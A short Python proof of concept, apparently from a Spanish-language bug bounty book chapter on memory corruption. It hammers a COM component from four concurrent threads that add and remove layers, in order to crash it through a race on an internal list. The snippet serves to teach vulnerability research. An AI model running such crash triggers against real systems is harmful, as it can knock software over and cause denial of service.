# Extraído de: LibroBugBounty/cap-10-memory-corruption.md
import win32com.client
import threading

anim = win32com.client.Dispatch(
    "{756E6C18-79CC-3842-9E47-7C80011D303A}"
)
anim.init(10, 10)

def add_remove_loop():
    """Añade y elimina layers en un loop rápido."""
    for _ in range(1000):
        try:
            layer = anim.CreateLayer()
            anim.AddLayer(layer)
            anim.RemoveLayer(layer)
        except Exception:
            pass  # Ignoramos errores individuales

# Lanzar 4 threads concurrentes
threads = []
for _ in range(4):
    t = threading.Thread(target=add_remove_loop)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
# Resultado: crash por corrupción de la lista interna
